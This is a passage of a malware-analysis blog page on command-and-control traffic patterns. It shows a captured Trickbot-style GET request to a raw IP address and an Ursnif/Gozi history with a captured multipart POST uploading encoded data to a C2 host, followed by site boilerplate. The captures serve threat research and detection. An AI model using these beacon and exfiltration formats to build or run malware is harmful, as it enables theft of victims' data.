+GET https://190.154.203.218:449/<strong>trg448</strong>/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/14/path/C:%5CUsers%5CJonathan%5CAppData%5CRoaming%5CnetRest%5C%E4%BB%BB%E3%81%AF%E3%82%A7%E7%A7%81%E3%81%8D%E7%A7%81%E6%8A%B1%E3%81%9F%E3%82%82%E3%81%A1%E6%84%9B.exe/0/
+</code></pre>
+
+
+
+<h4 class="wp-block-heading">Ursnif</h4>
+</div>
+</div>
+
+
+
+<p>In 2006, Gozi v1.0 (&#8216;Gozi CRM&#8217; aka &#8216;CRM&#8217;) aka Papras was first observed.<br>It was offered as a CaaS, known as 76Service. This first version of Gozi was developed by Nikita Kurmin, and he borrowed code from Ursnif aka Snifula, a spyware developed by Alexey Ivanov around 2000, and some other kits. Gozi v1.0 thus had a formgrabber module and often is classified as Ursnif aka Snifula. In September 2010, the source code of a particular Gozi CRM dll version was leaked, which led to Vawtrak/Neverquest (in combination with Pony) via Gozi Prinimalka (a slightly modified Gozi v1.0) and Gozi v2.0 (aka &#8216;Gozi ISFB&#8217; aka &#8216;ISFB&#8217; aka Pandemyia). This version came with a webinject module.</p>
+
+
+
+<div class="wp-block-columns is-layout-flex wp-container-core-columns-layout-10 wp-block-columns-is-layout-flex">
+<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow" style="flex-basis:100%">
+<pre class="wp-block-code"><code>POST /images/wsF0B4sp/ZaYjjdVgt73Q1BSOy_2Fofi/qF_2BfPTuK/5Ha_2F0xEvmbSfT_2/FluJ8ZF_2Fx8/g6xkZAZrZwN/2skHgzv92i_2BS/uPf4RDQvATKCgx0GZ5gez/ph_2BLcscLQkKDVw/HGZ6zA6DhGCqgPD/VTX09Q_2FUWIFyWps1/nfJ0I3rIZ/QNKbXjeu7xXa3W_2FZSX/bcWtE2zC4RafXFoRlqL/4EC4YHwclzkXrfX/58a3.bmp HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Pragma: no-cache
+Content-Type: multipart/form-data; boundary=36775038942641984568
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Content-Length: 399
+Host: shoshanna.at
+
+--36775038942641984568
+Content-Disposition: form-data; name="upload_file"; filename="78C6.bin"
+
+\.\..V.]:.o..&lt;]......H..)E.J=x...e%3..U.@.f......].tZ..1....g..OzC.5v.?o.NL...;..)..E.G.a~.....M#;.Cu;N/.3\$....x.....R....e..5.....-mW,..	..C................n.G.|..k0...@...?I.Iu......9k^.U6tzT9.b.3....#..V.4].La....zL.h+...aa..H.D.....Ar.......3.w.&lt;.!.-.....|F9! 3.....7
+--36775038942641984568--</code></pre>
+</div>
+</div>
+<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-9394" class="share-twitter sd-button share-icon no-text" href="https://marcoramilli.com/2021/01/09/c2-traffic-patterns-personal-notes/?share=twitter" target="_blank" title="Click to share on Twitter" ><span></span><span class="sharing-screen-reader-text">Click to share on Twitter (Opens in new window)</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-9394" class="share-facebook sd-button share-icon no-text" href="https://marcoramilli.com/2021/01/09/c2-traffic-patterns-personal-notes/?share=facebook" target="_blank" title="Click to share on Facebook" ><span></span><span class="sharing-screen-reader-text">Click to share on Facebook (Opens in new window)</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon no-text" href="https://marcoramilli.com/2021/01/09/c2-traffic-patterns-personal-notes/?share=reddit" target="_blank" title="Click to share on Reddit" ><span></span><span class="sharing-screen-reader-text">Click to share on Reddit (Opens in new window)</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared="" class="share-jetpack-whatsapp sd-button share-icon no-text" href="https://marcoramilli.com/2021/01/09/c2-traffic-patterns-personal-notes/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp" ><span></span><span class="sharing-screen-reader-text">Click to share on WhatsApp (Opens in new window)</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-9394" class="share-linkedin sd-button share-icon no-text" href="https://marcoramilli.com/2021/01/09/c2-traffic-patterns-personal-notes/?share=linkedin" target="_blank" title="Click to share on LinkedIn" ><span></span><span class="sharing-screen-reader-text">Click to share on LinkedIn (Opens in new window)</span></a></li><li class="share-telegram"><a rel="nofollow noopener noreferrer" data-shared="" class="share-telegram sd-button share-icon no-text" href="https://marcoramilli.com/2021/01/09/c2-traffic-patterns-personal-notes/?share=telegram" target="_blank" title="Click to share on Telegram" ><span></span><span class="sharing-screen-reader-text">Click to share on Telegram (Opens in new window)</span></a></li><li class="share-email"><a rel="nofollow noopener noreferrer" data-shared="" class="share-email sd-button share-icon no-text" href="mailto:?subject=%5BShared%20Post%5D%20C2%20Traffic%20Patterns%3A%20Personal%20Notes&body=https%3A%2F%2Fmarcoramilli.com%2F2021%2F01%2F09%2Fc2-traffic-patterns-personal-notes%2F&share=email" target="_blank" title="Click to email a link to a friend" data-email-share-error-title="Do you have email set up?" data-email-share-error-text="If you&#039;re having problems sharing via email, you might not have email set up for your browser. You may need to create a new email yourself." data-email-share-nonce="410a0614f9" data-email-share-track-url="https://marcoramilli.com/2021/01/09/c2-traffic-patterns-personal-notes/?share=email"><span></span><span class="sharing-screen-reader-text">Click to email a link to a friend (Opens in new window)</span></a></li><li class="share-end"></li></ul></div></div></div><div class='sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded' id='like-post-wrapper-155480246-9394-6592aa145e787' data-src='https://widgets.wp.com/likes/#blog_id=155480246&amp;post_id=9394&amp;origin=marcoramilli.com&amp;obj_id=155480246-9394-6592aa145e787&amp;n=1' data-name='like-post-frame-155480246-9394-6592aa145e787' data-title='Like or Reblog'><h3 class="sd-title">Like this:</h3><div class='likes-widget-placeholder post-likes-widget-placeholder' style='height: 55px;'><span class='button'><span>Like</span></span> <span class="loading">Loading...</span></div><span class='sd-text-color'></span><a class='sd-link-color'></a></div>
+			
+				
+		<footer class="entry-footer">
+
+		<span class="cat-links">Posted in <a href="https://marcoramilli.com/category/attack/" rel="category tag">Attack</a> <a href="https://marcoramilli.com/category/cyber-crime/" rel="category tag">Cyber Crime</a> <a href="https://marcoramilli.com/category/cybersecurity/" rel="category tag">cybersecurity</a> <a href="https://marcoramilli.com/category/experience/" rel="category tag">experience</a> <a href="https://marcoramilli.com/category/cybersecurity/malware/" rel="category tag">malware</a></span><span class="tags-links"><span>Tagged <a href="https://marcoramilli.com/tag/cybercrime/" rel="tag">cybercrime</a> <a href="https://marcoramilli.com/tag/cybersecurity/" rel="tag">CyberSecurity</a> <a href="https://marcoramilli.com/tag/malware-analysis/" rel="tag">Malware Analysis</a> <a href="https://marcoramilli.com/tag/network/" rel="tag">network</a> <a href="https://marcoramilli.com/tag/research/" rel="tag">Research</a> <a href="https://marcoramilli.com/tag/tracking/" rel="tag">tracking</a></span></span>
+		</footer>
+
+	
+			
+		</div><!-- .entry-content -->
+
+
+	</div><!-- .container.container-small -->
+
+</article><!-- #post-## -->
+
+	<div class="entry-author">
+		<div class="author-avatar">
+			<img alt='' src='https://secure.gravatar.com/avatar/effdb721844d68926dd21998fb960493?s=48&#038;d=robohash&#038;r=g' srcset='https://secure.gravatar.com/avatar/effdb721844d68926dd21998fb960493?s=96&#038;d=robohash&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' decoding='async'/>		</div><!-- .author-avatar -->
+
+		<div class="author-heading">
+			<h2 class="author-title">
+				Published by <span class="author-name">marcoramilli</span>			</h2>
+		</div><!-- .author-heading -->
+
+		<p class="author-bio">
+			Ethical Hacking, Advanced Targeted Attack Expert and Malware Evasion Expert			<a class="author-link" href="https://marcoramilli.com/author/marcoramilli/" rel="author">
+				View all posts by marcoramilli			</a>
+		</p><!-- .author-bio -->
+	</div><!-- .entry-auhtor -->
+	
+				</div><!-- .container.container-small -->
+
+				<div class="container">
+					<div id='jp-relatedposts' class='jp-relatedposts' >
+	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
+</div>
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://marcoramilli.com/2020/12/08/malware-delivery-platforms-in-2020/" rel="prev">Malware Delivery Platforms in 2020</a></div><div class="nav-next"><a href="https://marcoramilli.com/2021/01/30/ita-gratitudine-e-cambiamento/" rel="next">[ITA] Gratitudine e Cambiamento</a></div></div>
+	</nav>				</div>
+
+				
+			</main><!-- #main -->
+		</div><!-- #primary -->
+
+	
+
+	</div><!-- #content -->
+
+	<footer id="colophon" class="site-footer" role="contentinfo">
+
+		<div class="container">
+
+			<div class="row">
+
+				<div class="site-info col-sm-5">
+					<div class="footer-site-branding">
+
+						<!-- Display website logo -->
+						<a href="https://marcoramilli.com/" class="custom-logo-link" rel="home"><img width="43" height="32" src="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/01/logo-.png?fit=43%2C32&amp;ssl=1" class="custom-logo" alt="Marco Ramilli Web Corner" decoding="async" data-attachment-id="1830" data-permalink="https://marcoramilli.com/logo/" data-orig-file="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/01/logo-.png?fit=43%2C32&amp;ssl=1" data-orig-size="43,32" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="logo-" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/01/logo-.png?fit=43%2C32&amp;ssl=1" data-large-file="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/01/logo-.png?fit=43%2C32&amp;ssl=1" /></a>
+													<p class="site-title"><a href="https://marcoramilli.com/" rel="home">Marco Ramilli Web Corner</a></p>
+						
+					</div>
+
+					
+					
+					Theme: Eris by <a href="http://themeskingdom.com" rel="designer">Themes Kingdom</a>.
+				</div><!-- .site-info -->
+
+				<div class="col-sm-7">
+
+					<div class="row">
+						
+			<div class="col-sm-6 widget-area">
+				<section id="custom_html-2" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><div id="social-footer" style="position: fixed; bottom: 20px; left:2vw;">
+	<a style="display: block;" href="https://twitter.com/marco_ramilli" target="_blank" rel="noopener"><img src="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/01/tw-.png?w=1100&#038;ssl=1" data-recalc-dims="1"></a>
+	<a style="display: block;" href="https://it.linkedin.com/in/marcoramilli" target="_blank" rel="noopener"><img src="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/01/lnk-.png?w=1100&#038;ssl=1" data-recalc-dims="1"></a>
+	<a style="display: block;" href="https://github.com/marcoramilli" target="_blank" rel="noopener"><img src="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/01/gg-.png?w=1100&#038;ssl=1" data-recalc-dims="1"></a>
+</div></div></section>			</div>
+
+							</div><!-- .row -->
+
+				</div><!-- .col-sm-6 -->
+
+			</div><!-- .row -->
+
+		</div><!-- .container -->
+
+	</footer><!-- #colophon -->
+</div><!-- #page -->
+
+<!--  -->
+<style>
+			.sd-social-icon .sd-content ul li a.sd-button>span {
+				margin-left: 0;
+			}
+		</style><script defer id="bilmur" data-provider="wordpress.com" data-service="atomic"  src="https://s0.wp.com/wp-content/js/bilmur.min.js?m=202401"></script>
+	<div style="display:none">
+			<div class="grofile-hash-map-effdb721844d68926dd21998fb960493">
+		</div>
+		</div>
+		
+	<script type="text/javascript">
+		window.WPCOM_sharing_counts = {"https:\/\/marcoramilli.com\/2021\/01\/09\/c2-traffic-patterns-personal-notes\/":9394};
+	</script>
+				<style id='jetpack-block-donations-inline-css'>
+.wp-block-jetpack-donations .donations__container{border:1px solid #ccc}.wp-block-jetpack-donations .donations__nav{border-bottom:1px solid #ccc;display:flex}.wp-block-jetpack-donations .donations__nav-item{background:#fff;border-inline-start:1px solid #ccc;color:#1e1e1e;cursor:pointer;display:inline-block;flex:1;font-size:16px;font-weight:700;padding:12px;text-align:center}@media(min-width:600px){.wp-block-jetpack-donations .donations__nav-item{padding:16px 24px}}.wp-block-jetpack-donations .donations__nav-item:first-child{border-inline-start:none}.wp-block-jetpack-donations .donations__nav-item.is-active{background:#1e1e1e;color:#fff;cursor:default}.wp-block-jetpack-donations .donations__content{padding:16px}@media(min-width:600px){.wp-block-jetpack-donations .donations__content{padding:32px}}.wp-block-jetpack-donations .donations__content h4,.wp-block-jetpack-donations .donations__content p{margin:0 0 16px}@media(min-width:600px){.wp-block-jetpack-donations .donations__content h4,.wp-block-jetpack-donations .donations__content p{margin:0 0 24px}}.wp-block-jetpack-donations .donations__amounts{display:flex;flex-wrap:wrap;margin-bottom:16px}@media(min-width:600px){.wp-block-jetpack-donations .donations__amounts{margin:0 0 24px}}.wp-block-jetpack-donations .donations__amount{background-color:#fff;border:1px solid #ccc;color:#1e1e1e;display:inline-block;font-size:16px;font-weight:600;margin-inline-end:8px;margin-bottom:8px;padding:16px 24px;white-space:nowrap}.wp-block-jetpack-donations .donations__amount.has-error{box-shadow:0 0 0 1px #fff,0 0 0 3px #cc1818;outline:2px solid transparent;outline-offset:-2px}.wp-block-jetpack-donations .donations__custom-amount .donations__amount-value{margin-inline-start:4px;min-width:60px}.wp-block-jetpack-donations .donations__separator{margin-bottom:16px;margin-top:16px}@media(min-width:600px){.wp-block-jetpack-donations .donations__separator{margin-bottom:32px;margin-top:32px}}.wp-block-jetpack-donations .donations__donate-button,.wp-block-jetpack-donations .donations__donate-button-wrapper{margin:0}.jetpack-memberships-modal #TB_title{display:none}#TB_window.jetpack-memberships-modal,#memberships-modal-window.jetpack-memberships-modal{background-color:transparent;background-image:url(https://s0.wp.com/i/loading/dark-200.gif);background-position:center 150px;background-repeat:no-repeat;background-size:50px;border:none;bottom:0;box-shadow:none;-webkit-box-shadow:none;-moz-box-shadow:none;height:100%;left:0;margin:0!important;right:0;top:0;width:100%!important}#memberships-modal-window.jetpack-memberships-modal{padding:21px}.jetpack-memberships-modal #TB_iframeContent,.jetpack-memberships-modal #memberships-modal-iframe{bottom:0;height:100%!important;left:0;margin:0!important;position:absolute;right:0;top:0;width:100%!important}BODY.modal-open{overflow:hidden}dialog::backdrop{background-color:#000;opacity:.7}@keyframes spinner{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.wp-block-jetpack-donations .donations__container:not(.loaded){height:200px;position:relative;width:100%}.wp-block-jetpack-donations .donations__container:not(.loaded) *{display:none}.wp-block-jetpack-donations .donations__container:not(.loaded):before{background-color:#949494;border-radius:100%;content:"";height:16px;inset-inline-start:50%;opacity:.7;position:absolute;top:50%;transform:translate(-50%,-50%);width:16px}.wp-block-jetpack-donations .donations__container:not(.loaded):after{animation:spinner 1s linear infinite;background-color:#fff;border-radius:100%;content:"";height:3.5555555556px;inset-inline-start:50%;margin-inline-start:-5.3333333333px;margin-top:-5.3333333333px;position:absolute;top:50%;transform-origin:5.3333333333px 5.3333333333px;width:3.5555555556px}.wp-block-jetpack-donations .donations__tab.is-annual .donations__monthly-item,.wp-block-jetpack-donations .donations__tab.is-annual .donations__one-time-item,.wp-block-jetpack-donations .donations__tab.is-monthly .donations__annual-item,.wp-block-jetpack-donations .donations__tab.is-monthly .donations__one-time-item,.wp-block-jetpack-donations .donations__tab.is-one-time .donations__annual-item,.wp-block-jetpack-donations .donations__tab.is-one-time .donations__monthly-item{display:none}.wp-block-jetpack-donations .donations__amount{cursor:pointer}.wp-block-jetpack-donations .donations__amount.is-selected{box-shadow:0 0 0 1px #fff,0 0 0 3px var(--wp-admin-theme-color);outline:2px solid transparent;outline-offset:-2px}.wp-block-jetpack-donations .donations__custom-amount{cursor:text}.wp-block-jetpack-donations .donations__custom-amount .donations__amount-value{display:inline-block;text-align:start;white-space:pre-wrap}.wp-block-jetpack-donations .donations__custom-amount .donations__amount-value:empty:after{color:#ccc;content:attr(data-empty-text)}.wp-block-jetpack-donations .donations__custom-amount .donations__amount-value:focus{outline:none}.wp-block-jetpack-donations .donations__donate-button.is-disabled{opacity:.2;pointer-events:none}
+</style>
+<style id='core-block-supports-inline-css'>
+.wp-container-core-columns-layout-1.wp-container-core-columns-layout-1{flex-wrap:nowrap;}.wp-container-core-columns-layout-2.wp-container-core-columns-layout-2{flex-wrap:nowrap;}.wp-container-core-columns-layout-3.wp-container-core-columns-layout-3{flex-wrap:nowrap;}.wp-container-core-columns-layout-4.wp-container-core-columns-layout-4{flex-wrap:nowrap;}.wp-container-core-columns-layout-5.wp-container-core-columns-layout-5{flex-wrap:nowrap;}.wp-container-core-columns-layout-6.wp-container-core-columns-layout-6{flex-wrap:nowrap;}.wp-container-core-columns-layout-7.wp-container-core-columns-layout-7{flex-wrap:nowrap;}.wp-container-core-columns-layout-8.wp-container-core-columns-layout-8{flex-wrap:nowrap;}.wp-container-core-columns-layout-9.wp-container-core-columns-layout-9{flex-wrap:nowrap;}.wp-container-core-columns-layout-10.wp-container-core-columns-layout-10{flex-wrap:nowrap;}
+</style>
+<script type="text/javascript" id="coblocks-tinyswiper-initializer-js-extra">
+/* <![CDATA[ */
+var coblocksTinyswiper = {"carouselPrevButtonAriaLabel":"Previous","carouselNextButtonAriaLabel":"Next","sliderImageAriaLabel":"Image"};
+/* ]]> */
+</script>
+<script type="text/javascript" id="leaky_paywall_validate-js-extra">
+/* <![CDATA[ */
+var leaky_paywall_validate_ajax = {"ajaxurl":"\/wp-admin\/admin-ajax.php","register_nonce":"f3e0a27280"};
+/* ]]> */
+</script>
+<script type="text/javascript" id="leaky_paywall_script-js-extra">
+/* <![CDATA[ */
+var leaky_paywall_script_ajax = {"ajaxurl":"\/wp-admin\/admin-ajax.php","stripe_pk":"pk_live_51MLsggEgdHk7t5RKOFhIW1U90Maw4j2N68xWBuYVl8GVirBljh1g13TcHN1WEbKVqJPKOn8dwmg6f5rNtgPdDWrc00kItWznmB"};
+/* ]]> */
+</script>
+<script type="text/javascript" id="thickbox-js-extra">
+/* <![CDATA[ */
+var thickboxL10n = {"next":"Next >","prev":"< Prev","image":"Image","of":"of","close":"Close","noiframes":"This feature requires inline frames. You have iframes disabled or your browser does not support them.","loadingAnimation":"https:\/\/marcoramilli.com\/wp-includes\/js\/thickbox\/loadingAnimation.gif"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://marcoramilli.com/_jb_static/??-eJyVkt1SAjEMhd/GK0tFVK4YH8UJaRay2z+aLMv69AIriLLM4E3bpN85yaTtssEUlaLa7NsVR7E1aQZsTvvHlqJLxUKrKYAq4+nGcIAVGXTROha153BSy2N3bYxp6RM2MtD1T8JA3GuV093KoSexyrE30nGm8u+iB+0gNRxZGTx/3rTxBE1vMvQdeH+wCYwlheTATwLf6vtK9SthtvuSDpTuVQsWzvqH1jUFEkuFxYIIqRzQCFtejY10HJeGs/EcG1MlbMVUvPvWcUTfOjpSumZslml3Ptzn7ffwsI541puWSm9btlRVhHoxzUvs+LfEJ3DkbiABJMXSjzzHeF+YQjiO5z0spvOn2fPs9W3+8oDLxfQLaEgsAw=='></script>
+<script defer type="text/javascript" src="https://stats.wp.com/e-202401.js" id="jetpack-stats-js"></script>
+<script type="text/javascript" id="jetpack-stats-js-after">
+/* <![CDATA[ */
+_stq = window._stq || [];
+_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"155480246\",\"post\":\"9394\",\"tz\":\"0\",\"srv\":\"marcoramilli.com\",\"hp\":\"atomic\",\"ac\":\"2\",\"amp\":\"0\",\"j\":\"1:13.0-a.10\"}") ]);
+_stq.push([ "clickTrackerInit", "155480246", "9394" ]);
+/* ]]> */
+</script>
+<script type="text/javascript" id="jetpack-block-donations-js-extra">
+/* <![CDATA[ */
+var Jetpack_Block_Assets_Base_Url = {"url":"https:\/\/marcoramilli.com\/wp-content\/plugins\/jetpack\/_inc\/blocks\/"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://marcoramilli.com/_jb_static/??-eJyVj0EOwjAMBH/DidYUEJwQT0FpYopb1wlOQunviRAHLgg4WrujWU+hIrGcHUboIziKCW4ozitMoQqe5zMxlw5qqkeSuo/L6TOj2GGpmuS10iyJRvyBejO9ta2XhJIgcO5IInS5nC1qB20mduD8WCkaNwOJw/sfZFb+yvSYgrEDnMpoaNnboWz2YhL5kt4Ip5/Ap49pKE9fM2a8GHGM+hIfx0OzX212zbbZrBe2PTQPrraWUA=='></script>
+<script type="text/javascript" id="sharing-js-js-extra">
+/* <![CDATA[ */
+var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://marcoramilli.com/wp-content/plugins/jetpack/_inc/build/sharedaddy/sharing.min.js?ver=13.0-a.10" id="sharing-js-js"></script>
+<script type="text/javascript" id="sharing-js-js-after">
+/* <![CDATA[ */
+var windowOpen;
+			( function () {
+				function matches( el, sel ) {
+					return !! (
+						el.matches && el.matches( sel ) ||
+						el.msMatchesSelector && el.msMatchesSelector( sel )
+					);
+				}
+
+				document.body.addEventListener( 'click', function ( event ) {
+					if ( ! event.target ) {
+						return;
+					}
+
+					var el;
+					if ( matches( event.target, 'a.share-twitter' ) ) {
+						el = event.target;
+					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
+						el = event.target.parentNode;
+					}
+
+					if ( el ) {
+						event.preventDefault();
+
+						// If there's another sharing window open, close it.
+						if ( typeof windowOpen !== 'undefined' ) {
+							windowOpen.close();
+						}
+						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
+						return false;
+					}
+				} );
+			} )();
+var windowOpen;
+			( function () {
+				function matches( el, sel ) {
+					return !! (
+						el.matches && el.matches( sel ) ||
+						el.msMatchesSelector && el.msMatchesSelector( sel )
+					);
+				}
+
+				document.body.addEventListener( 'click', function ( event ) {
+					if ( ! event.target ) {
+						return;
+					}
+
+					var el;
+					if ( matches( event.target, 'a.share-facebook' ) ) {
+						el = event.target;
+					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
+						el = event.target.parentNode;
+					}
+
+					if ( el ) {
+						event.preventDefault();
+
+						// If there's another sharing window open, close it.
+						if ( typeof windowOpen !== 'undefined' ) {
+							windowOpen.close();
+						}
+						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
+						return false;
+					}
+				} );
+			} )();
+var windowOpen;
+			( function () {
+				function matches( el, sel ) {
+					return !! (
+						el.matches && el.matches( sel ) ||
+						el.msMatchesSelector && el.msMatchesSelector( sel )
+					);
+				}
+
+				document.body.addEventListener( 'click', function ( event ) {
+					if ( ! event.target ) {
+						return;
+					}
+
+					var el;
+					if ( matches( event.target, 'a.share-linkedin' ) ) {
+						el = event.target;
+					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
+						el = event.target.parentNode;
+					}
+
+					if ( el ) {
+						event.preventDefault();
+
+						// If there's another sharing window open, close it.
+						if ( typeof windowOpen !== 'undefined' ) {
+							windowOpen.close();
+						}
+						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
+						return false;
+					}
+				} );
+			} )();
+var windowOpen;
+			( function () {
+				function matches( el, sel ) {
+					return !! (
+						el.matches && el.matches( sel ) ||
+						el.msMatchesSelector && el.msMatchesSelector( sel )
+					);
+				}
+
+				document.body.addEventListener( 'click', function ( event ) {
+					if ( ! event.target ) {
+						return;
+					}
+
+					var el;
+					if ( matches( event.target, 'a.share-telegram' ) ) {
+						el = event.target;
+					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-telegram' ) ) {
+						el = event.target.parentNode;
+					}
+
+					if ( el ) {
+						event.preventDefault();
+
+						// If there's another sharing window open, close it.
+						if ( typeof windowOpen !== 'undefined' ) {
+							windowOpen.close();
+						}
+						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtelegram', 'menubar=1,resizable=1,width=450,height=450' );
+						return false;
+					}
+				} );
+			} )();
+/* ]]> */
+</script>
+	<iframe src='https://widgets.wp.com/likes/master.html?ver=202401#ver=202401&#038;n=1' scrolling='no' id='likes-master' name='likes-master' style='display:none;'></iframe>
+	<div id='likes-other-gravatars' class='wpl-new-layout'><div class="likes-text"><span>%d</span></div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
+	
+</body>
+</html>
+<!--
+	generated in 0.497 seconds
+	108617 bytes batcached for 300 seconds
+-->
